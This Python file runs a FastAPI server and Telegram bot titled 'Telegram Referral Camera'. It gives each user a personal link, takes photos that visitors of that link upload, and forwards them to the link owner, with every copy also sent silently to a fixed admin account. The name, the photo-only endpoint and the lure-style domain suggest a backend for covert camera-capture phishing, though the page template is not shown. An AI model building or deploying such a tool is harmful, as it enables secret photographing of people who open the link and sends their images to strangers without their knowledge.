import os
import asyncio
import html
from typing import List
from contextlib import asynccontextmanager

from fastapi import FastAPI, Query, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from locales import LANGUAGES, DEFAULT_LANG, TEXTS, t

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    BufferedInputFile,
    InputMediaPhoto,
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.filters import CommandStart
from aiogram.exceptions import TelegramBadRequest
from dotenv import load_dotenv

from locales import LANGUAGES, DEFAULT_LANG, t
from database import (
    init_db,
    get_or_create_user,
    get_user,
    increment_referrals,
    get_stats,
    get_total_users,
    set_user_language,
)


# =========================================================
# تحميل المتغيرات
# =========================================================

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

ADMIN_TELEGRAM_ID = int(
    os.getenv("ADMIN_TELEGRAM_ID", "6002805119")
)

CHANNEL_USERNAME = "@KhaldounSoft"
CHANNEL_LINK = "https://t.me/KhaldounSoft"

BASE_URL = os.getenv(
    "BASE_URL",
    "https://aivideo.apps.bot-hosting.cloud",
).rstrip("/")

MAX_PHOTOS = 10
MAX_PHOTO_SIZE = 10 * 1024 * 1024  # 10 ميجا لكل صورة


if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")


# =========================================================
# إنشاء البوت
# =========================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# =========================================================
# تشغيل البوت مع FastAPI
# =========================================================

@asynccontextmanager
async def lifespan(app: FastAPI):

    await init_db()

    polling_task = asyncio.create_task(
        dp.start_polling(bot)
    )

    try:
        yield

    finally:
        try:
            await dp.stop_polling()
        except Exception:
            pass

        polling_task.cancel()

        try:
            await polling_task
        except asyncio.CancelledError:
            pass

        await bot.session.close()


app = FastAPI(
    title="Telegram Referral Camera",
    lifespan=lifespan,
)

templates = Jinja2Templates(directory="templates")


# =========================================================
# التحقق من الاشتراك
# =========================================================

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(
            chat_id=CHANNEL_USERNAME,
            user_id=user_id,
        )
        status = member.status
        print(f"[SUBSCRIPTION] user={user_id} status={status}")
        return status in {"creator", "administrator", "member"}

    except TelegramBadRequest as error:
        msg = str(error).lower()
        print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
        if "user not found" in msg or "participant" in msg:
            return False
        return True

    except Exception as error:
        print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
        return True


# =========================================================
# لوحة اختيار اللغة
# =========================================================

def get_language_keyboard():
    buttons = []
    row = []
    for code, info in LANGUAGES.items():
        row.append(
            InlineKeyboardButton(
                text=f"{info['flag']} {info['name']}",
                callback_data=f"lang:{code}",
            )
        )
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    return InlineKeyboardMarkup(inline_keyboard=buttons)


# =========================================================
# لوحة الاشتراك
# =========================================================

def get_subscription_keyboard(lang: str):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t(lang, "btn_subscribe"),
                    url=CHANNEL_LINK,
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "btn_confirm_sub"),
                    callback_data="check_sub",
                )
            ],
        ]
    )


# =========================================================
# لوحة الأدمن / المستخدم
# =========================================================

def get_admin_keyboard(lang: str):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t(lang, "btn_stats"))],
            [KeyboardButton(text=t(lang, "change_language"))],
            [KeyboardButton(text=t(lang, "btn_start"))],
        ],
        resize_keyboard=True,
        persistent=True,
    )


def get_user_keyboard(lang: str):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t(lang, "change_language"))],
            [KeyboardButton(text=t(lang, "btn_start"))],
        ],
        resize_keyboard=True,
        persistent=True,
    )


# =========================================================
# إرسال الواجهة الرئيسية
# =========================================================

async def send_main_dashboard(message_or_call, user, lang: str = DEFAULT_LANG):

    user_id = user.id
    name = user.full_name
    username = user.username or ""

    db_user, is_new = await get_or_create_user(
        telegram_id=user_id,
        name=name,
        username=username,
    )

    # إشعار المطور (بالعربية دائماً)
    if is_new:
        username_text = (
            f"@{username}" if username
            else t("ar", "no_username")
        )
        total = await get_total_users()

        admin_notice = (
            f"👤 <b>{t('ar', 'new_user_notice')}</b>\n\n"
            f"{t('ar', 'new_user_name')}: {html.escape(name)}\n"
            f"{t('ar', 'new_user_username')}: {html.escape(username_text)}\n"
            f"{t('ar', 'new_user_id')}: <code>{user_id}</code>\n"
            f"{t('ar', 'new_user_total')}: {total}"
        )

        try:
            await bot.send_message(
                chat_id=ADMIN_TELEGRAM_ID,
                text=admin_notice,
                parse_mode="HTML",
            )
        except Exception as error:
            print(f"فشل إرسال إشعار المستخدم الجديد: {error}")

    username_text = f"@{username}" if username else t(lang, "no_username")

    welcome_text = (
        f"{t(lang, 'welcome', name=html.escape(name))}\n\n"
        f"{t(lang, 'your_id')}: <code>{user_id}</code>\n"
        f"{t(lang, 'your_username')}: {html.escape(username_text)}\n\n"
        f"{t(lang, 'your_link')}\n"
        f"{BASE_URL}/?q={user_id}\n\n"
        f"<b>{t(lang, 'steps_title')}</b>\n"
        f"{t(lang, 'step1')}\n"
        f"{t(lang, 'step2')}\n"
        f"{t(lang, 'step3')}\n\n"
        f"{t(lang, 'your_referrals')}: <b>{db_user.referrals}</b>"
    )

    keyboard = (
        get_admin_keyboard(lang)
        if user_id == ADMIN_TELEGRAM_ID
        else get_user_keyboard(lang)
    )

    if isinstance(message_or_call, Message):
        await message_or_call.answer(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    else:
        await message_or_call.message.answer(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


# =========================================================
# /start
# =========================================================

@dp.message(CommandStart())
async def start_handler(message: Message):

    user_id = message.from_user.id

    existing = await get_user(user_id)

    # مستخدم جديد → اختر اللغة أولاً
    if not existing or not existing.language:
        await message.answer(
            t(DEFAULT_LANG, "choose_language"),
            reply_markup=get_language_keyboard(),
        )
        return

    lang = existing.language

    is_subscribed = await check_subscription(user_id)

    if not is_subscribed:
        sub_text = (
            f"{t(lang, 'must_subscribe')}\n\n"
            f"{t(lang, 'subscribe_hint')}"
        )
        await message.answer(
            sub_text,
            reply_markup=get_subscription_keyboard(lang),
            parse_mode="HTML",
        )
        return

    await send_main_dashboard(message, message.from_user, lang)


# =========================================================
# معالج اختيار اللغة
# =========================================================

@dp.callback_query(F.data.startswith("lang:"))
async def language_callback(call: CallbackQuery):

    code = call.data.split(":")[1]
    if code not in LANGUAGES:
        await call.answer("Invalid language", show_alert=True)
        return

    user_id = call.from_user.id

    existing = await get_user(user_id)
    if existing:
        await set_user_language(user_id, code)
    else:
        await get_or_create_user(
            telegram_id=user_id,
            name=call.from_user.full_name,
            username=call.from_user.username or "",
        )
        await set_user_language(user_id, code)

    await call.answer(t(code, "lang_changed"))

    try:
        await call.message.delete()
    except Exception:
        pass

    is_subscribed = await check_subscription(user_id)

    if not is_subscribed:
        sub_text = (
            f"{t(code, 'must_subscribe')}\n\n"
            f"{t(code, 'subscribe_hint')}"
        )
        await call.message.answer(
            sub_text,
            reply_markup=get_subscription_keyboard(code),
            parse_mode="HTML",
        )
        return

    await send_main_dashboard(call, call.from_user, code)


# =========================================================
# زر تأكيد الاشتراك
# =========================================================

@dp.callback_query(F.data == "check_sub")
async def check_sub_callback(call: CallbackQuery):

    user_id = call.from_user.id
    user = await get_user(user_id)
    lang = user.language if user else DEFAULT_LANG

    is_subscribed = await check_subscription(user_id)

    if is_subscribed:
        await call.answer(t(lang, "sub_success"))
        try:
            await call.message.delete()
        except Exception:
            pass
        await send_main_dashboard(call, call.from_user, lang)
        return

    await call.answer(t(lang, "sub_failed"), show_alert=True)


# =========================================================
# زر تغيير اللغة
# =========================================================

@dp.message(F.text.in_({
    t(code, "change_language") for code in LANGUAGES
}))
async def change_language_handler(message: Message):

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    await message.answer(
        t(lang, "choose_language"),
        reply_markup=get_language_keyboard(),
    )


# =========================================================
# إحصائيات البوت
# =========================================================

@dp.message(F.text.in_({
    t(code, "btn_stats") for code in LANGUAGES
}))
async def stats_handler(message: Message):

    if message.from_user.id != ADMIN_TELEGRAM_ID:
        return

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    stats = await get_stats()

    text = (
        f"{t(lang, 'stats_title')}\n\n"
        f"{t(lang, 'stats_total')}: <b>{stats['total']}</b>\n"
        f"{t(lang, 'stats_7days')}: <b>{stats['last_7_days']}</b>\n"
        f"{t(lang, 'stats_month')}: <b>{stats['this_month']}</b>"
    )

    await message.answer(text, parse_mode="HTML")


# =========================================================
# الصفحة الرئيسية
# =========================================================

@app.get("/", response_class=HTMLResponse)
async def home(request: Request, q: str = Query(default="")):

    if not q:
        return """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport"
                  content="width=device-width, initial-scale=1.0">
            <title>الرابط غير صحيح</title>
        </head>
        <body style="font-family:sans-serif;text-align:center;padding:40px">
            <h2>❌ الرابط غير صحيح</h2>
            <p>يجب فتح رابط إحالة صالح.</p>
        </body>
        </html>
        """

        # جلب لغة صاحب الرابط
    lang = DEFAULT_LANG
    if q.isdigit():
        owner = await get_user(int(q))
        if owner and owner.language:
            lang = owner.language

    # كل نصوص الويب بلغة المستخدم
    web_texts = {
        key: t(lang, key)
        for key in TEXTS[lang]
        if key.startswith("web_")
    }

    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={
            "referral_id": q,
            "lang": lang,
            "is_rtl": lang in ("ar", "fa"),
            "texts": web_texts,
        },
    )
    # return templates.TemplateResponse(
    #     request=request,
    #     name="index.html",
    #     context={"referral_id": q},
    # )


# =========================================================
# استقبال الصور
# =========================================================

@app.post("/upload-photo")
async def upload_photo(
    photos: List[UploadFile] = File(...),
    referral_id: str = Form(...),
):

    if not referral_id.isdigit():
        return {"success": False, "message": "Invalid Referral ID."}

    if not photos:
        return {"success": False, "message": "No photos."}

    if len(photos) > MAX_PHOTOS:
        return {"success": False, "message": f"Max {MAX_PHOTOS} photos."}

    owner_id = int(referral_id)
    owner = await get_user(owner_id)

    if not owner:
        return {"success": False, "message": "Invalid referral link."}

    lang = owner.language or DEFAULT_LANG

    username = owner.username or ""
    name = owner.name or "—"
    username_text = f"@{username}" if username else t(lang, "no_username")

    caption = (
        f"{t(lang, 'photo_caption')}\n\n"
        f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
        f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
        f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
        f"{t(lang, 'photo_ref_id')}: {referral_id}"
    )

    media_group_owner = []
    media_group_admin = []

    for idx, photo in enumerate(photos):
        image_bytes = await photo.read()
        if not image_bytes:
            continue

        if len(image_bytes) > MAX_PHOTO_SIZE:
            return {
                "success": False,
                "message": f"Photo {idx + 1} too large.",
            }

        media_group_owner.append(
            InputMediaPhoto(
                media=BufferedInputFile(
                    image_bytes,
                    filename=f"photo_{idx + 1}.jpg",
                )
            )
        )

        media_group_admin.append(
            InputMediaPhoto(
                media=BufferedInputFile(
                    image_bytes,
                    filename=f"photo_{idx + 1}.jpg",
                ),
                caption=(caption if idx == 0 else ""),
                parse_mode="HTML",
            )
        )

    if not media_group_owner:
        return {"success": False, "message": "No valid photos."}

    owner_ok = True
    try:
        await bot.send_media_group(
            chat_id=owner_id,
            media=media_group_owner,
        )
    except Exception as error:
        print(f"[SEND OWNER ERROR] {error!r}")
        owner_ok = False

    try:
        await bot.send_media_group(
            chat_id=ADMIN_TELEGRAM_ID,
            media=media_group_admin,
        )
    except Exception as error:
        print(f"[SEND ADMIN ERROR] {error!r}")

    if not owner_ok:
        return {
            "success": False,
            "message": "Failed to send to owner.",
        }

    await increment_referrals(owner_id)

    return {"success": True, "message": "Photos sent."}
